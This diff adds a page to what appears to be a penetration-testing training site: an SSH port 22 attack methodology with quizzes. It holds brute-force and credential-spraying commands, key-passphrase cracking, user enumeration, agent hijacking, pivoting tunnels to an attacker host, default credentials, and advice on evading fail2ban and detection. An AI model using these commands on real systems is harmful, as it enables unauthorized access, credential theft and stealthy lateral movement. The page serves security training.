@@ -1,0 +1,385 @@
+---
+title: SSH - Port 22
+description: Enumeration and attack methodology for SSH on port 22 leaked-key attacks, credential reuse, user enumeration, brute force, and tunneling/pivoting.
+openGraph:
+  title: "SSH - Port 22"
+  description: "Enumeration and attack methodology for SSH on port 22 leaked-key attacks, credential reuse, user enumeration, brute force, and tunneling/pivoting."
+  images:
+    - url: /imgs/ssh.jpg
+      width: 1672
+      height: 941
+      alt: SSH - Port 22
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "SSH - Port 22"
+  description: "Enumeration and attack methodology for SSH on port 22 leaked-key attacks, credential reuse, user enumeration, brute force, and tunneling/pivoting."
+  images:
+    - url: /imgs/ssh.jpg
+      width: 1672
+      height: 941
+      alt: SSH - Port 22
+      type: image/jpeg
+---
+
+# SSH Port 22
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nc -nv <IP> 22
+nmap -sV -sC -p22 <IP>
+nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p22 <IP>
+
+# Confirm which auth methods the server accepts.
+ssh -v <USER>@<IP> 2>&1 | grep -i "authentications that can continue"
+
+# automated audit
+ssh-audit <IP>
+
+# Connect 
+ssh <USER>@<IP>
+ssh -o PreferredAuthentications=password <USER>@<IP>
+chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>
+ssh -p <PORT> <USER>@<IP>
+
+# Crack a key passphrase
+ssh2john id_rsa > hash.txt && john hash.txt --wordlist=<WORDLIST>
+
+# Brute force (low threads to dodge fail2ban) last resort
+hydra -l <USER> -P <WORDLIST> ssh://<IP> -t 4
+hydra -L users.txt -P passwords.txt ssh://<IP> -t 4
+
+# Tunneling local fwd / SOCKS proxy / remote fwd
+ssh -L <LPORT>:127.0.0.1:<RPORT> <USER>@<IP>
+ssh -D 9050 <USER>@<IP>
+ssh -R <LPORT>:127.0.0.1:<RPORT> <USER>@<LHOST>
+```
+
+## Methodology
+
+### Phase 1: Fingerprint and Accepted Auth Methods
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What exact OpenSSH (or other) version and OS is the banner advertising?
+  - Which authentication methods does the server actually accept `password`, `publickey`, `keyboard-interactive`?
+  - If only `publickey` is accepted, is brute force off the table entirely, forcing me toward key discovery?
+  - Does the version map to a known CVE (e.g. CVE-2018-15473 user enum on OpenSSH < 7.7, regreSSHion on 8.5p1–9.7p1)?
+  - Are weak ciphers, MACs, or SSHv1 present that change the threat model?
+</Callout>
+
+```bash
+nc -nv <IP> 22
+nmap -sV -sC -p22 <IP>
+# Full algorithm + vulnerability audit
+ssh-audit <IP>
+
+# Which auth methods are accepted?
+ssh -v <USER>@<IP> 2>&1 | grep -i "authentications that can continue"
+
+# Version-to-CVE lookup
+searchsploit openssh <version>
+```
+
+- [ ] `nc -nv <IP> 22` read the banner (e.g. `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`). The distro suffix gives you the OS and patchlevel, which narrows CVE applicability.
+- [ ] `nmap -sV -sC -p22 <IP>` default scripts return host keys, supported algorithms, and accepted auth methods together.
+- [ ] `ssh-audit <IP>` flags weak ciphers, deprecated MACs, known CVEs, and policy violations. A heavily hardened config signals a mature target; a weak one hints at a neglected host.
+- [ ] `ssh -v <USER>@<IP> 2>&1 | grep -i "authentications that can continue"` confirm accepted methods. If only `publickey` is offered, brute force is impossible pivot straight to key discovery (Phase 2).
+- [ ] `searchsploit openssh <version>` and search `OpenSSH <version> exploit` if OpenSSH < 7.7, flag CVE-2018-15473 user enumeration for Phase 4.
+
+### Phase 2: Leaked Private Keys
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Did any earlier service (FTP, SMB, NFS, Rsync, web, Git) already hand me a private key?
+  - Which username does this key belong to, and how do I find out?
+  - Is the key passphrase-protected, and is that passphrase crackable?
+  - Are the file permissions correct, or will SSH refuse the key?
+  - Has this same key been reused across multiple hosts in the environment?
+</Callout>
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa <USER>@<IP>
+
+# Reveal the public key the trailing comment is often user@host
+ssh-keygen -y -f id_rsa
+
+# Crack a passphrase-protected key
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=<WORDLIST>
+
+# Test one key against many hosts/users
+nxc ssh <IP> -u <USER> -p '' --key-file id_rsa
+```
+
+- [ ] Revisit every prior loot source for `id_rsa`, `*.pem`, `*.key`: ftp, nfs shares, smb shares, rsync modules, web roots and exposed `.git`. Leaked keys are far more common than weak passwords on hardened SSH.
+- [ ] `chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>` SSH refuses keys with loose permissions, so always fix the mode first, or you will blame a good key.
+- [ ] `ssh-keygen -y -f id_rsa` print the public key. The trailing comment is frequently `user@host`, which reveals the owning username.
+- [ ] If prompted for a passphrase: `ssh2john id_rsa > hash.txt && john hash.txt --wordlist=<WORDLIST>`. Admin SSH passphrases tend to follow the same weak patterns as their passwords crack first, prompt second.
+- [ ] Try the key against every known username  the owner is rarely obvious. Start with `root`; keys forgotten on shares are usually admin keys.
+
+### Phase 3: Credential Reuse and Defaults
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which usernames and passwords have I already recovered from other services?
+  - Does this host share an admin account with anything I have already compromised?
+  - Are there appliance/IoT defaults worth trying (`root:root`, `admin:admin`, `pi:raspberry`)?
+  - Have I tried the lazy `username:username` pattern for every known user?
+  - Which other hosts in the subnet accept the same credential?
+</Callout>
+
+```bash
+nxc ssh <IP> -u <USER> -p <PASS>
+nxc ssh <IP> -u users.txt -p found_passwords.txt
+nxc ssh <SUBNET>/24 -u <USER> -p <PASS>
+```
+
+- [ ] Spray credentials harvested from databases, web app configs, FTP files, SNMP process arguments, and mail against SSH. Credential reuse is the single most common SSH entry point a password from one service routinely unlocks SSH.
+- [ ] `nxc ssh <IP> -u <USER> -p <PASS>` fast single-credential validation with parseable output before you commit to a spray.
+- [ ] Try appliance defaults: `root:root`, `root:toor`, `admin:admin`, `admin:password`, `pi:raspberry`. Network gear and IoT devices still ship with these.
+- [ ] If usernames are known but no passwords: try `username:username` pairs a common lazy-admin pattern.
+- [ ] `nxc ssh <SUBNET>/24 -u <USER> -p <PASS>` a single valid credential sprayed across the subnet often reveals a dozen hosts sharing the same account, which is instant lateral movement.
+
+### Phase 4: User Enumeration and Brute Force
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is the server old enough (OpenSSH < 7.7) for CVE-2018-15473 timing enumeration to validate my user list?
+  - Which usernames have I gathered from SMTP VRFY, RID cycling, web apps, SNMP, or LFI `/etc/passwd` dumps?
+  - Is password auth even enabled, or is the server publickey-only (making brute force impossible)?
+  - What lockout / fail2ban / `MaxStartups` controls apply, and what is the OPSEC cost of tripping them?
+  - Is a small, targeted password list smarter than rockyou against this account?
+</Callout>
+
+```bash
+# Validate usernames without auth-failure logs (OpenSSH < 7.7 only)
+python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt <IP>
+
+# Per-user accepted auth methods (root is often publickey-only)
+nmap --script ssh-auth-methods --script-args="ssh.user=<USER>" -p22 <IP>
+
+# Brute force multi-user spray with parseable output
+nxc ssh <IP> -u users.txt -p passwords.txt
+
+```
+
+- [ ] If OpenSSH < 7.7: `python3 ssh_user_enum.py --userList <WORDLIST> <IP>` confirms valid usernames via timing without generating auth-failure logs. Patched in 7.7+, so verify the version from Phase 1 first.
+- [ ] `nmap --script ssh-auth-methods --script-args="ssh.user=<USER>" -p22 <IP>` different users may have different policies (root often restricted to publickey). This tells you which accounts are even brute-forceable, so you do not waste attempts on publickey-only users.
+- [ ] Cross-reference usernames from SMTP VRFY, RID cycling, web apps, SNMP, and LFI `/etc/passwd` dumps a validated list makes any spray far more efficient.
+- [ ] `hydra -l <USER> -P <WORDLIST> ssh://<IP> -t 4` keep threads at 4 or fewer; fail2ban triggers on as few as 3–5 failures and SSH refuses connections beyond `MaxStartups`. Prefer a small targeted list over rockyou.
+- [ ] If password auth is disabled (publickey only): brute force is mathematically impossible return to Phase 2 key discovery and Phase 3 credential harvesting.
+- [ ] If locked out: wait the fail2ban window, switch source IP, or pivot through another compromised host.
+
+<Callout type="warning">
+**OPSEC:** SSH brute force is extremely loud. Every failed attempt hits `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS) and forwards to the SIEM in mature environments. Keep `-t 4` or lower, exhaust every other credential source first, and never throw rockyou at an account that might lock out.
+</Callout>
+
+### Phase 5: Post-Access Orientation and Pivoting
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Who am I, and what can this account reach that my attack box cannot?
+  - Is this host dual-homed  does it bridge into a segmented internal network?
+  - Which other hosts has this user already authenticated to (`known_hosts`)?
+  - Is an SSH agent loaded that I can hijack to reach further systems without the private key?
+  - What credentials, keys, and configs are lying around to spray onward before I escalate?
+</Callout>
+
+```bash
+id; hostname; ip a
+
+# SSH artifacts 
+cat ~/.ssh/config ~/.ssh/known_hosts ~/.ssh/authorized_keys 2>/dev/null
+
+# Agent hijack check
+echo $SSH_AUTH_SOCK; ssh-add -l 2>/dev/null
+
+# Pivoting reach one internal service / whole subnet
+ssh -L 8080:10.10.1.5:80 <USER>@<IP>
+ssh -D 9050 <USER>@<IP>
+
+# Spray these creds across the subnet
+nxc ssh <SUBNET>/24 -u <USER> -p <PASS>
+```
+
+- [ ] SSH gives a stable TTY immediately skip shell stabilization and go straight to transferring enumeration tools.
+- [ ] `id; hostname; ip a` establish identity and check for extra interfaces. Additional NICs mean a dual-homed pivot host, the highest-value lateral-movement asset.
+- [ ] `ssh -L 8080:10.10.1.5:80 <USER>@<IP>` reach a single internal service directly; `ssh -D 9050 <USER>@<IP>` + proxychains gives full-subnet TCP access for `proxychains nmap -sT -Pn <SUBNET>/24`.
+- [ ] `echo $SSH_AUTH_SOCK` if set, hijack the agent to reach other systems with the user's forwarded keys, leaving auth logs that look like normal activity.
+- [ ] `cat ~/.ssh/known_hosts` (confirmed reachable hosts), `~/.ssh/authorized_keys` (who else logs in here), `~/.ssh/config` (jump hosts, key paths) then spray creds with `nxc ssh <SUBNET>/24`.
+
+<Callout>
+For multi-hop pivoting, segmented networks, or anything more complex than a single jump, switch to **ligolo-ng**. SSH SOCKS works for one-off forwards but becomes painful with stacked hops and only supports TCP —ligolo gives a real interface that nmap, Metasploit, and proxychains use natively.
+</Callout>
+
+<Quiz
+  question="You have OpenSSH 8.2 exposed. Password auth is enabled. You have 50 usernames from SMTP VRFY but no passwords, and brute force is in scope. What's your first move?"
+  options={[
+    "Run hydra with full rockyou.txt against every user it's allowed",
+    "Spray a tiny list of common passwords against all 50 users with low concurrency",
+    "Try CVE-2018-15473 username enumeration first to validate the list",
+    "Check other services for credential leaks first, then come back"
+  ]}
+  answer={3}
+  explanation="OpenSSH 8.2 is patched against CVE-2018-15473 (works only on < 7.7), so option C fails. Hydra with rockyou invites lockouts, fail2ban, and SIEM alerts while being slower than every alternative. Even spraying is premature when you haven't checked credential reuse — passwords harvested from FTP, SMB, web apps, and databases routinely work on SSH. Always exhaust reuse before any brute force; a small targeted spray (option B) is only the fallback after that."
+/>
+
+## Overview
+
+SSH provides encrypted remote access and replaces insecure legacy protocols like Telnet and rlogin. It supports password and public-key authentication, full TCP tunneling, and arbitrary subsystem multiplexing which is why it is both the most common admin protocol and the most useful pivoting tool on a Linux engagemen
+
+| Detail | Value |
+|--------|-------|
+| Port | 22/TCP (default) |
+| Protocol | SSH-2 (current), SSH-1 (deprecated, vulnerable) |
+| Encryption | AES, ChaCha20 (transport), RSA/Ed25519/ECDSA (key exchange) |
+| Config (server) | `/etc/ssh/sshd_config` |
+| Config (client) | `/etc/ssh/ssh_config`, `~/.ssh/config` |
+| Auth log | `/var/log/auth.log` (Debian/Ubuntu), `/var/log/secure` (RHEL/CentOS) |
+
+## Quick Reference
+
+```bash
+ssh <USER>@<IP>                                 # Connect to SSH
+ssh -i id_rsa <USER>@<IP>                       # Connect with a private key
+ssh -o PreferredAuthentications=password <USER>@<IP>    # Force password authentication
+nc -nv <IP> 22                                  # Banner grab to check SSH version
+ssh -v <USER>@<IP>                              # Verbose SSH connection for debugging
+nmap -sV -sC -p22 <IP>                          # Nmap scan for service and default scripts on port 22
+ssh-audit <IP>                                  # Audit SSH server configuration and security
+nmap --script ssh-auth-methods --script-args="ssh.user=root" -p22 <IP>  # Check available authentication methods
+nxc ssh <IP> -u users.txt -p passwords.txt      # Credential spraying with user/password lists
+ssh -L <LPORT>:127.0.0.1:<RPORT> <USER>@<IP>    # Local port forward for individual service access
+ssh -D 9050 <USER>@<IP>                         # Dynamic SOCKS proxy for full-subnet pivoting
+```
+
+
+## NetExec (nxc)
+
+NetExec is the fastest way to test SSH credentials at scale. It replaces `crackmapexec`, supports key files, executes commands, and produces clean parseable output for scripting.
+
+```bash
+# Authentication testing
+nxc ssh <IP> -u <USER> -p <PASS>
+nxc ssh <IP> -u users.txt -p passwords.txt
+nxc ssh <IP> -u <USER> -p '' --key-file id_rsa
+
+# Command execution
+nxc ssh <IP> -u <USER> -p <PASS> -x "whoami"
+nxc ssh <IP> -u <USER> -p <PASS> -x "cat /etc/passwd"
+
+# Subnet sweep find SSH servers accepting these creds
+nxc ssh <SUBNET>/24 -u <USER> -p <PASS>
+```
+
+### SSH Agent Hijacking
+
+If SSH agent forwarding is enabled on a host you have compromised, you can use the user's loaded keys to reach other systems without ever touching the private key file:
+
+```bash
+# Check for an active SSH agent
+echo $SSH_AUTH_SOCK
+ls -la /tmp/ssh-*/
+
+# If found, hijack the agent socket
+export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXXX
+ssh-add -l    # List keys loaded in the agent
+ssh <USER>@<INTERNAL_HOST>    # Use the forwarded key
+```
+
+<Callout type="warning">
+**OPSEC:** Agent hijacking requires root or the same UID as the agent owner. This is a post-compromise lateral-movement technique. it lets you authenticate as the user to any system their forwarded keys can reach, leaving auth-log entries that look exactly like the user's normal SSH activity. Almost invisible to detection if used carefully.
+</Callout>
+
+## SSH Tunneling and Pivoting
+
+### Local Port Forwarding
+
+```bash
+# Forward local 8080 to internal host 10.10.1.5:80 through the SSH server
+ssh -L 8080:10.10.1.5:80 <USER>@<IP>
+```
+### Dynamic SOCKS Proxy
+
+Route arbitrary traffic through the SSH host. The SOCKS proxy listens on your local machine and forwards every connection out through the pivot.
+
+```bash
+# Create the SOCKS proxy
+ssh -D 9050 <USER>@<IP>
+
+# Configure proxychains (/etc/proxychains4.conf):
+#   socks5 127.0.0.1 9050
+
+# Route tools through the proxy
+proxychains nmap -sT -Pn 10.10.1.0/24
+proxychains curl http://10.10.1.5
+```
+
+### Remote Port Forwarding
+
+```bash
+# From the target, forward its local 3306 to your attacker machine on 3306
+ssh -R 3306:127.0.0.1:3306 <USER>@<LHOST>
+
+# Now connect to localhost:3306 on your attacker box to reach the target's MySQL
+```
+
+<Callout>
+For multi-hop pivoting, segmented networks, or anything more complex than a single jump, switch to **ligolo-ng**. SSH tunneling works for one-off port forwards but becomes painful with stacked hops ligolo gives you a real interface that nmap, Metasploit, and proxychains all use natively.
+</Callout>
+
+
+## Dangerous Settings (sshd_config)
+
+| Setting | Risk |
+|---------|------|
+| `PasswordAuthentication yes` | Password brute force possible |
+| `PermitEmptyPasswords yes` | Empty passwords allowed trivial access |
+| `PermitRootLogin yes` | Direct root login high-value brute force target |
+| `Protocol 1` | SSHv1 deprecated, vulnerable to MITM and key recovery |
+| `X11Forwarding yes` | GUI forwarding abusable for keylogging with agent forwarding |
+| `AllowTcpForwarding yes` | Tunneling allowed useful for pivoting post-compromise |
+| `PermitTunnel yes` | Layer 2/3 tunneling full VPN-like access |
+| `AuthorizedKeysFile` | Custom path keys may live in unexpected locations |
+| `AllowAgentForwarding yes` | Agent forwarding enables key hijacking on compromised hosts |
+| `DebianBanner yes` | OS fingerprinting from the banner |
+
+
+## Default Credentials
+
+| System | Username | Password |
+|--------|----------|----------|
+| Linux default | `root` | `root` / `toor` |
+| Ubuntu/Debian | `root` | (disabled by default; try `ubuntu`) |
+| Network devices | `admin` | `admin` |
+| IoT / embedded | `root` | `root` / (empty) / device-specific |
+| Raspberry Pi | `pi` | `raspberry` |
+| VMware ESXi | `root` | (set during install) |
+| pfSense | `admin` | `pfsense` |
+
+
+<Quiz
+  question="You have SSH as a low-privilege user on a dual-homed host. What's the highest-value immediate action?"
+  options={[
+    "Run a full nmap scan of the external network again",
+    "Set up a SOCKS proxy and pillage local creds/keys before escalating",
+    "Immediately launch a kernel exploit for root",
+    "Delete the auth logs to stay hidden"
+  ]}
+  answer={1}
+  explanation="A dual-homed host is a pivot. Stand up `ssh -D 9050` (or ligolo-ng) to reach the internal subnet, then pillage `.bash_history`, configs, SSH keys, and any loaded agent these frequently unlock the next host without any privesc. Kernel exploits are noisy and risk crashing the box; deleting logs before you've extracted value is premature and itself an IOC."
+/>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #Linux #RedTeam #Certification #SSH #Pivoting #CredentialReuse #BruteForce #KeyAttacks
+</div>
